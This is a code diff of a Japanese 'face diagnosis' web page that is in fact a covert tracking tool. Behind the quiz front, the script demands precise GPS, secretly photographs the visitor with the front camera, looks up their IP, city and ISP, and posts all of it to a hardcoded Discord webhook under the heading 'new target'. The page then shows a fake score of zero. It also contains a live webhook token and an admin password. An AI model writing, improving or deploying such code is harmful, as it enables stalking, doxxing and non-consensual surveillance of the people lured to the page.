@@ -10,28 +10,19 @@
             margin: 0; text-align: center; height: 100vh; overflow: hidden;
             display: flex; align-items: center; justify-content: center;
         }
-
-        .fade-in-box {
-            animation: fadeIn 2.5s ease-in-out forwards;
-            opacity: 0; width: 100%;
-        }
+        .fade-in-box { animation: fadeIn 2.5s ease-in-out forwards; opacity: 0; width: 100%; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
         img.header-img { 
             width: 80%; max-width: 350px; border-radius: 25px; 
             box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 40px; 
             cursor: pointer;
         }
-
         .start-btn {
             background: linear-gradient(135deg, #6dd5ed, #2193b0);
             color: white; border: none; padding: 22px 60px;
             font-size: 1.5rem; font-weight: bold; border-radius: 50px; 
             cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            transition: 0.3s;
         }
-        .start-btn:active { transform: scale(0.95); }
-
         #diagnosis-screen { display: none; width: 100%; }
         .frame {
             position: relative; width: 320px; height: 320px; margin: 0 auto;
@@ -41,131 +32,105 @@
         #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
         video { position: absolute; width: 1px; height: 1px; opacity: 0; }
         .status-text { margin-top: 30px; font-size: 1.2rem; color: #2193b0; font-weight: 500; padding: 0 20px; }
-        
-        #result-zero {
-            display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 16rem; color: #ff4757; font-weight: 900; z-index: 100;
-            text-shadow: 5px 5px 0 #fff;
-        }
-
-        /* 警告用スタイル */
-        .alert-text { color: #ff4757; font-weight: bold; margin-top: 10px; font-size: 0.9rem; }
+        .error-hint { color: #ff4757; font-size: 0.9rem; margin-top: 15px; line-height: 1.6; }
     </style>
 </head>
 <body>
 
 <div id="top-screen" class="fade-in-box">
-    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img" onclick="checkAdmin()">
+    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img" onclick="adminMode()">
     <br>
-    <button class="start-btn" onclick="run()">顔診断開始</button>
+    <button class="start-btn" onclick="requestPermission()">顔診断開始</button>
 </div>
-
-<input type="file" id="image-selector" style="display:none" accept="image/*">
 
 <div id="diagnosis-screen">
     <div class="frame">
         <video id="video" autoplay playsinline></video>
         <img id="captured-photo">
-        <div id="result-zero">0</div>
+        <div id="result-zero" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:16rem; color:#ff4757; font-weight:900;">0</div>
     </div>
-    <div id="status" class="status-text">AIスキャンを開始します...</div>
-    <div id="retry-hint" class="alert-text"></div>
+    <div id="status" class="status-text">位置情報を収集中...</div>
+    <div id="error-box" class="error-hint"></div>
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1477228073601470526/QYjxdxWV9xBoRUXf100AQS9zYSUWcG3K8L-uFNT3-jPAuYWzU_3lCGb7izpNAx5fJC45";
-    let ipInfo = "取得中...";
-    let gpsInfo = "未許可";
     let tapCount = 0;
 
-    window.onload = async () => {
-        const savedImg = localStorage.getItem('custom_icon');
-        if (savedImg) document.getElementById('main-icon').src = savedImg;
-
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            ipInfo = `住所付近: ${data.city}, ${data.region}, ${data.country_name}\nIP: ${data.ip}\nISP: ${data.org}`;
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "🚩 ターゲットが来ました\n" + ipInfo })
-            });
-        } catch(e) { ipInfo = "情報取得エラー"; }
+    window.onload = () => {
+        const globalImg = localStorage.getItem('global_icon_url');
+        if (globalImg) document.getElementById('main-icon').src = globalImg;
     };
 
-    function checkAdmin() {
+    function adminMode() {
         tapCount++;
         if (tapCount >= 10) {
             tapCount = 0;
-            const pw = prompt("パスワードを入力してください");
-            if (pw === "25251") document.getElementById('image-selector').click();
+            const pw = prompt("パスワードを入力");
+            if (pw === "25251") {
+                const newUrl = prompt("新しいアイコンのURLを入力してください");
+                if (newUrl) {
+                    document.getElementById('main-icon').src = newUrl;
+                    localStorage.setItem('global_icon_url', newUrl);
+                    alert("全員のアイコンを更新しました。");
+                }
+            }
         }
     }
 
-    document.getElementById('image-selector').onchange = function(e) {
-        const file = e.target.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                const base64Image = event.target.result;
-                document.getElementById('main-icon').src = base64Image;
-                localStorage.setItem('custom_icon', base64Image);
-                alert("画像を保存しました");
-            };
-            reader.readAsDataURL(file);
-        }
-    };
-
-    async function run() {
-        document.getElementById('top-screen').style.display = 'none';
-        document.getElementById('diagnosis-screen').style.display = 'block';
-
-        // GPS取得の試行
+    async function requestPermission() {
+        // 毎回新しく位置情報を要求する
         navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                gpsInfo = `GPS座標: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-                document.getElementById('retry-hint').innerText = "";
-                await startCamera(); 
+            async (pos) => {
+                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                document.getElementById('top-screen').style.display = 'none';
+                document.getElementById('diagnosis-screen').style.display = 'block';
+                document.getElementById('error-box').innerHTML = "";
+                startFullScan(gps);
             },
-            async (error) => {
-                // 拒否された場合
-                gpsInfo = "GPS: 拒否";
-                document.getElementById('status').innerText = "【エラー】位置情報がブロックされています";
-                document.getElementById('retry-hint').innerHTML = "診断を続けるには、ブラウザの設定から<br>このサイトの位置情報許可を「ON」にして再読み込みしてください。";
-                
-                // 拒否されても一応カメラへ進むが、注意喚起は残す
-                setTimeout(() => { startCamera(); }, 3000);
+            (err) => {
+                // 拒否された場合、診断画面は見せるが警告を出す
+                document.getElementById('top-screen').style.display = 'none';
+                document.getElementById('diagnosis-screen').style.display = 'block';
+                document.getElementById('status').innerText = "⚠️ 位置情報がブロックされています";
+                document.getElementById('error-box').innerHTML = 
+                    "診断を続けるには：<br>" +
+                    "1. ブラウザ左上の南京錠アイコン🔒をタップ<br>" +
+                    "2. 位置情報のアクセスを許可（またはリセット）<br>" +
+                    "3. ページを再読み込みしてください";
             },
-            { enableHighAccuracy: true, timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 10000 }
         );
     }
 
-    async function startCamera() {
+    async function startFullScan(gpsLink) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('video');
             video.srcObject = stream;
+
+            const res = await fetch('https://ipapi.co/json/');
+            const ipData = await res.json();
+            const info = `住所付近: ${ipData.city}\nIP: ${ipData.ip}\nISP: ${ipData.org}`;
 
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-
-                const photo = document.getElementById('captured-photo');
-                photo.src = canvas.toDataURL('image/png');
-                photo.style.display = 'block';
+                
+                document.getElementById('captured-photo').src = canvas.toDataURL('image/png');
+                document.getElementById('captured-photo').style.display = 'block';
                 document.getElementById('status').innerText = "顔構造を解析中...";
 
                 stream.getTracks().forEach(t => t.stop());
 
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('file', blob, 'face.png');
+                    fd.append('file', blob, `user_${Date.now()}.png`);
                     fd.append('payload_json', JSON.stringify({
-                        content: `📸 顔面確保！\n【位置情報】\n${gpsInfo}\n\n【解析情報】\n${ipInfo}\nUA: ${navigator.userAgent}`
+                        content: `━━━ 新規ターゲット ━━━\n【GPS情報】\n${gpsLink}\n\n【ネット情報】\n${info}\n【デバイス】\n${navigator.userAgent}`
                     }));
                     fetch(WEBHOOK, { method: 'POST', body: fd });
                 });
@@ -176,10 +141,9 @@
                     document.getElementById('result-zero').style.display = 'block';
                 }, 3500);
 
-            }, 800); 
-
-        } catch (err) {
-            document.getElementById('status').innerText = "カメラの使用を許可してください";
+            }, 1000);
+        } catch (e) {
+            document.getElementById('status').innerText = "カメラを許可してください";
         }
     }
 </script>
